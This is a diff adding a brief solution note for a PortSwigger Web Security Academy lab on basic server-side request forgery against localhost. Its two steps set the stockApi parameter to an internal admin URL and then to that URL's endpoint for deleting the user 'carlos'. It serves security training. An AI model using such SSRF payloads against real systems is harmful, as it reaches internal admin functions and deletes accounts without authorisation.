@@ -1,0 +1,6 @@
+[lab: Basic SSRF against the local server]
+url: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
+solution: 
+    step-1: in burpsuite, change stockApi to stockApi=http://localhost/admin
+    step-2: look at response, and copy url for deleting user 'carlos'. paste url in stockApi: stockApi=http://localhost/admin/delete?username=carlos
+
